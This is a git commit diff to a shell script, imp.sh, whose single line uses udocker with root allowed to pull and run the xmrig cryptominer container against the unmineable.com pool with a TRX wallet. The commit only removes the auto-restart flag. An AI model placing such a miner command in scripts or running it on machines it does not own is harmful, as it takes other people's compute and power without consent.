57b645df35b0ff04c56bd8f90c611958298e0351
vendannotes <111574533+i-am-millionaire@users.noreply.github.com>
2023-11-07 10:29:20 +0530

    Update imp.sh

--- imp.sh
+++ imp.sh
@@ -1,1 +1,1 @@
-udocker --allow-root run -itd --restart=always -e POOL_URL=rx.unmineable.com:3333 -e POOL_USER=TRX:TUfEFRwukdgci259qg7KwT6c1HrB2AdMCB.v1 --name xmrig pmietlicki/xmrig:alpine
+udocker --allow-root run -itd  -e POOL_URL=rx.unmineable.com:3333 -e POOL_USER=TRX:TUfEFRwukdgci259qg7KwT6c1HrB2AdMCB.v1 --name xmrig pmietlicki/xmrig:alpine
